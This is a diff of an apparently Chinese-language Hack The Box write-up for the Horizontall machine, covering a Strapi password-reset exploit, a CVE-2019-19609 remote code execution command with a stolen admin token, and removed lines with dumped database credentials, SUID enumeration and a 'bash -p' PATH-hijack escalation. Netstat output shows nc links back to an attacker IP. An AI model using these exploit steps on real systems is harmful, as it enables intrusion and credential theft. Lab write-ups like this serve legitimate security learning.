@@ -193,9 +193,11 @@ Target: http://api-prod.horizontall.htb/
 [+] Password reset was successfully
 [+] Your email is: admin@horizontall.htb
 [+] Your new credentials are: admin:SuperStrongPassword1
-[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjM4NTEwOTgzLCJleHAiOjE2NDExMDI5ODN9.CgP6ELEARwvGa0-sXY9Lr_bb1etWPiz5q_BMsUxks3o
+[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjM4NTk0MzkyLCJleHAiOjE2NDExODYzOTJ9.ixIRhKXcMV26i5Z8N3GuDASApeq3r6CSPfZQDlZGFjc
 ```
 此时我们有了一个cms的登录凭证：```admin:SuperStrongPassword1```
+
+同时记住这个token：```eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjM4NTk0MzkyLCJleHAiOjE2NDExODYzOTJ9.ixIRhKXcMV26i5Z8N3GuDASApeq3r6CSPfZQDlZGFjc```
 
 
 登录进入后台以后，我们在仪表盘发现cms的版本号是：```Strapi v3.0.0-beta.17.4```
@@ -207,12 +209,12 @@ Target: http://api-prod.horizontall.htb/
 执行下面payload
 
 
-> python3 exp2.py "http://api-prod.horizontall.htb" "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjM4NTEwOTgzLCJleHAiOjE2NDExMDI5ODN9.CgP6ELEARwvGa0-sXY9Lr_bb1etWPiz5q_BMsUxks3o" "id" "10.10.14.15" 
+> python3 exp2.py "http://api-prod.horizontall.htb" "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjM4NTk0MzkyLCJleHAiOjE2NDExODYzOTJ9.ixIRhKXcMV26i5Z8N3GuDASApeq3r6CSPfZQDlZGFjc" "id" "10.10.14.15" 
 
 
 ```
 ┌──(root💀kali)-[~/htb/Horizontall]
-└─# python3 exp2.py "http://api-prod.horizontall.htb" "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjM4NTEwOTgzLCJleHAiOjE2NDExMDI5ODN9.CgP6ELEARwvGa0-sXY9Lr_bb1etWPiz5q_BMsUxks3o" "id" "10.10.14.15"
+└─# python3 exp2.py "http://api-prod.horizontall.htb" "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjM4NTk0MzkyLCJleHAiOjE2NDExODYzOTJ9.ixIRhKXcMV26i5Z8N3GuDASApeq3r6CSPfZQDlZGFjc" "id" "10.10.14.15"
 
 =====================================
 CVE-2019-19609 - Strapi RCE
@@ -327,89 +329,17 @@ strapi
 
 ```
 
-strapi@horizontall:~/myapi/config/environments/development$ cat database.json
-cat database.json
-{
-  "defaultConnection": "default",
-  "connections": {
-    "default": {
-      "connector": "strapi-hook-bookshelf",
-      "settings": {
-        "client": "mysql",
-        "database": "strapi",
-        "host": "127.0.0.1",
-        "port": 3306,
-        "username": "developer",
-        "password": "#J!:F9Zt2u"
-      },
-      "options": {}
-    }
-  }
-}
-
-
-mysql> show tables;
-show tables;
-+------------------------------+
-| Tables_in_strapi             |
-+------------------------------+
-| core_store                   |
-| reviews                      |
-| strapi_administrator         |
-| upload_file                  |
-| upload_file_morph            |
-| users-permissions_permission |
-| users-permissions_role       |
-| users-permissions_user       |
-+------------------------------+
-
-
-find / -perm -4000 -print >/dev/null
-
-
-rwsr-xr-x 1 root root 146K Jan 19  2021 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable                                                                                                                                       
--rwsr-xr-x 1 root root 37K Mar 22  2019 /usr/bin/newgidmap
--rwsr-xr-x 1 root root 19K Jun 28  2019 /usr/bin/traceroute6.iputils
--rwsr-xr-x 1 root root 37K Mar 22  2019 /usr/bin/newuidmap
--rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/gpasswd
--rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
--rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/chfn  --->  SuSE_9.3/10
--rwsr-xr-x 1 root root 59K Mar 22  2019 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
--rwsr-xr-x 1 root root 40K Mar 22  2019 /usr/bin/newgrp  --->  HP-UX_10.20
--rwsr-xr-x 1 root root 22K Mar 27  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
--rwsr-xr-x 1 root root 44K Mar 22  2019 /usr/bin/chsh (Unknown SUID binary)
--rwsr-xr-x 1 root root 427K Aug 11 18:02 /usr/lib/openssh/ssh-keysign
--rwsr-xr-- 1 root messagebus 42K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper (Unknown SUID binary)
--rwsr-xr-x 1 root root 99K Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
--rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device (Unknown SUID binary)
--rwsr-xr-x 1 root root 116K Mar 26  2021 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
--rwsr-xr-x 1 root root 14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
--rwsr-xr-x 1 root root 31K Aug 11  2016 /bin/fusermount (Unknown SUID binary)
--rwsr-xr-x 1 root root 63K Jun 28  2019 /bin/ping
--rwsr-xr-x 1 root root 44K Mar 22  2019 /bin/su
--rwsr-xr-x 1 root root 27K Sep 16  2020 /bin/umount  --->  BSD/Linux(08-1996)
--rwsr-xr-x 1 root root 43K Sep 16  2020 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-
-
-echo "#!/bin/bash" > passwd
-
-echo "bash -p" > passwd
-
-
-
-
-acorn            he                    optipng      sshpk-sign
-ansi-html        html-minifier         parser       sshpk-verify
-atob             import-local-fixture  passwd       strapi
-autoprefixer     is-docker             pino         strip-indent
-browserslist     jsesc                 pngquant     svgo
-cross-env        json5                 rc           terser
-cross-env-shell  js-yaml               regjsparser  uglifyjs
-cssesc           knex                  rimraf       uuid
-cwebp            loose-envify          seek-bunzip  string
-direction        lpad-align            seek-table   webpack-cli
-errno            miller-rabin          semver       webpack-dev-server
-esparse          mime                  sha.js       which
-esvalidate       mkdirp                shjs         xml2js
-gifsicle         mozjpeg               showdown
-har-validator    multicast-dns         sshpk-conv
+查看所有tcp连接
+```
+netstat -nap|grep tcp
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:8088            0.0.0.0:*               LISTEN      30505/python3       
+tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1856/node /usr/bin/ 
+tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 10.10.11.105:59330      10.10.14.15:4242        CLOSE_WAIT  30456/nc            
+tcp        0     23 10.10.11.105:59348      10.10.14.15:4242        ESTABLISHED 33027/nc            
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -     
+```
